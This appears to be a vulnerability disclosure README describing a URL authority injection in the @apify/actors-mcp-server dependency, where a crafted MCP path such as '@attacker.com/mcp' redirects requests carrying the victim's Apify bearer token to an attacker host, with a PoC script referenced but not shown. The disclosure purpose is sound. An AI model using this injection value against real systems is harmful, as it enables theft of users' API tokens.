# URL Authority Injection Vulnerability in `de-anthropocentric-research-engine-main`

A URL authority injection vulnerability exists in the `de-anthropocentric-research-engine-main` project. This project depends on `@apify/actors-mcp-server` version `<= 0.10.10` (locked at `0.10.4`), which contains the vulnerable code.

[`de-anthropocentric-research-engine-main`](https://github.com/your-username/de-anthropocentric-research-engine) : A research engine for discovering and reproducing security vulnerabilities in modern software supply chains.

The code in line `44` of the `src/mcp/actors.ts` file in the `@apify/actors-mcp-server` dependency have a function that builds the Actor standby MCP URL. The URL is constructed using string concatenation: `` `${standbyUrl}${mcpServerPath}` ``, and since there is no security validation on the `mcpServerPath` value returned by the Apify API, by constructing a malicious `webServerMcpPath` field such as `@attacker.com/mcp`, the resulting URL becomes `https://real-actor.apify.actor@attacker.com/mcp`. The Node.js URL parser interprets `real-actor.apify.actor` as the `username` and `attacker.com` as the actual `hostname`. Because the MCP Client unconditionally attaches an `Authorization: Bearer *** header, the victim's Apify API token is sent to the attacker-controlled server.

In the vulnerability replication environment, `poc-en.mjs` in this repository demonstrates the token exfiltration. It starts a local HTTPS server on `127.0.0.1:31337` and injects `@127.0.0.1:31337/mcp` as the malicious MCP path.

**I executed the PoC script in a macOS test environment, which resulted in the victim's Apify API token being leaked to the attacker server via the injected URL authority.**

I put `poc-en.mjs`, `attacker-cert.pem`, `attacker-key.pem`, and `VULNERABILITY_REPRODUCTION_EN.md` file for the vulnerability reproduction in this repository as well.

[`actors.ts` vulnerable code location in the upstream project](https://github.com/apify/apify-mcp-server/blob/main/src/mcp/actors.ts)
